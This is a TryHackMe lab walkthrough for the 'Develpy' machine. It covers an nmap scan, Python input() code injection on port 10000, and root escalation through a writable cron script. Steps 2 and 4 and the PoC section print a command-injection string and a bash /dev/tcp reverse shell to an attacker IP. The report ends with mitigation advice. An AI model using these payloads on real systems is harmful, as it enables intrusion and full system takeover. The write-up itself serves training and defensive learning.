# 🟩Develpy - Try Hack Me (THM) Walkthrough Report  

**Prepared by:** Nishanth Antony  
**Date:** October 29, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open ports, services, and potential vulnerabilities.
- **Commands Used:**  
  ```bash
  nmap -p- -sV --min-rate=1000 10.201.68.213 -T4 -v
  ```
- **Findings:**
  - Open ports: SSH (22), Unknown service (10000).
  - SSH version: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8.
  - Port 10000 ran a Python script (`exploit.py`) prompting for the number of exploits to send, with a response indicating a potential code execution vulnerability.

---

## 2. Exploitation Process

### Step 1 – Service Enumeration (Port 10000)
- Connected to port 10000 using `nc`:
  ```bash
  nc 10.201.68.213 10000
  ```
- Received prompt: `Please enther number of exploits to send??`.
- Inputting a number (e.g., `1`) returned a message about attacking `tryhackme.com` with details like `beacons_seq=1 ttl=1337 time=0.01 ms`.
- Non-numeric input (e.g., `a`) triggered a Python `NameError`, revealing the script (`exploit.py`) was vulnerable to code injection via the `input()` function.

### Step 2 – Code Injection
- Exploited the Python script’s `input()` function to execute arbitrary code:
  ```bash
  nc 10.201.68.213 10000
  __import__('os').system('bash')
  ```
- **Result:** Gained a shell as user `king` (uid=1000, member of `adm`, `cdrom`, `dip`, `plugdev`, `lpadmin`, `sambashare` groups).
- Found files in `/home/king`: `credentials.png`, `exploit.py`, `root.sh`, `run.sh`, `user.txt`.
- Extracted `user.txt` (flag redacted).

### Step 3 – Privilege Escalation Analysis
- Inspected `/etc/crontab` to identify scheduled tasks:
  ```bash
  cat /etc/crontab
  ```
- Found cron jobs running every minute:
  - `king` user: Executes `/home/king/run.sh`.
  - `root` user: Executes `/home/king/root.sh` and `/root/company/run.sh`.

### Step 4 – Privilege Escalation via Cron Job
- Noticed `root.sh` in `/home/king` was writable by `king` and executed by `root` via cron.
- Overwrote `root.sh` with a reverse shell payload:
  ```bash
  echo "bash -i >& /dev/tcp/10.23.156.151/4444 0>&1" > root.sh
  ```
- Later refined the payload and set execution permissions:
  ```bash
  rm root.sh
  echo 'bash -i >& /dev/tcp/10.23.156.151/6969 0>&1' > root.sh
  chmod +x root.sh
  ```
- Set up a listener on the attack machine:
  ```bash
  nc -lvnp 6969
  ```
- **Result:** Received a root shell (`root@ubuntu`) when the cron job executed `root.sh`.

### Step 5 – Flag Extraction
- Navigated to `/root` and found `root.txt` (flag redacted).
- Also identified `/root/company` directory and additional files in `/home/king` (`test.txt`, `root.txt`).

---

## 3. Proof of Concept (PoC)

- **Code Injection:**  
  ```bash
  nc 10.201.68.213 10000
  __import__('os').system('bash')
  ```
  Gained `king` user shell.
- **Cron Job Exploitation:**  
  Overwrote `/home/king/root.sh`:
  ```bash
  echo 'bash -i >& /dev/tcp/10.23.156.151/6969 0>&1' > root.sh
  chmod +x root.sh
  ```
  Set up listener:
  ```bash
  nc -lvnp 6969
  ```
  Obtained `root` shell.
- **Flag Retrieval:**  
  Accessed `/home/king/user.txt` and `/root/root.txt` (flags redacted).

---

## 4. Privilege Escalation

- Exploited a cron job running `root.sh` as `root` from a writable directory (`/home/king`).
- Injected a reverse shell payload into `root.sh`, executed by the cron job, granting `root` access.

---

## 5. Mitigation Recommendations

- **Service Hardening:**  
  - Secure port 10000 by removing or restricting access to `exploit.py`.
  - Sanitize user input in Python scripts to prevent code injection (e.g., avoid `input()` for untrusted input).
- **Cron Job Security:**  
  - Ensure scripts executed by cron (e.g., `root.sh`) are not writable by non-root users.
  - Restrict cron jobs to non-sensitive directories or use absolute paths for root-owned scripts.
- **File Permissions:**  
  - Remove write permissions for non-root users on files executed by `root` (e.g., `chmod 644 root.sh`).
- **Network Security:**  
  - Limit SSH and port 10000 access to trusted IPs using firewall rules.
  - Monitor network traffic for suspicious reverse shell connections.
- **Patch Management:**  
  - Update OpenSSH (7.2p2 is outdated) to the latest version.
  - Regularly audit cron jobs and running services for misconfigurations.

---

## 6. Lessons Learned

- **Input Validation:** Python scripts using `input()` are vulnerable to code injection if not sanitized.
- **Cron Job Misconfigurations:** Scripts executed by `root` in user-writable directories enable privilege escalation.
- **File Permissions:** Insecure permissions on critical scripts can lead to system compromise.
- **Service Exposure:** Open ports running custom scripts (e.g., port 10000) can expose vulnerabilities if not properly secured.

---

## 7. Skills Practiced

- Network and service scanning (`nmap`)
- Service enumeration with `netcat`
- Python script exploitation via code injection
- Cron job analysis and privilege escalation
- Reverse shell creation and handling
- Secure reporting and mitigation strategies

---
